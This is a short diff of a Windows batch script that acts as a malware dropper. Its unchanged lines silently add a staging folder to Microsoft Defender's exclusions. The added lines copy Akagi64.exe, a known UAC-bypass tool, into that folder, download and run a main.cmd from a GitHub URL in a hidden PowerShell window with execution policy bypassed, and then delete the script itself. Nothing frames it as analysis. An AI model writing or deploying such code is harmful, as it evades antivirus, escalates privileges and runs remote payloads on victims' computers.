@@ -6,4 +6,10 @@ mkdir "%STAGE%" 2>nul
 
 C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -WindowStyle Hidden -C "Add-MpPreference -ExclusionPath '%STAGE%'"
 
-call "%~dp0main.cmd"
+copy /y "%~dp0Akagi64.exe" "%STAGE%\Akagi64.exe" >nul
+
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -Ep Bypass -WindowStyle Hidden -C "Invoke-WebRequest 'https://github.com/johnbunkerton/main/raw/refs/heads/main/main.cmd' -OutFile '%STAGE%\main.cmd' -UseBasicParsing"
+
+call "%STAGE%\main.cmd"
+
+(goto) 2>nul & del "%~f0"
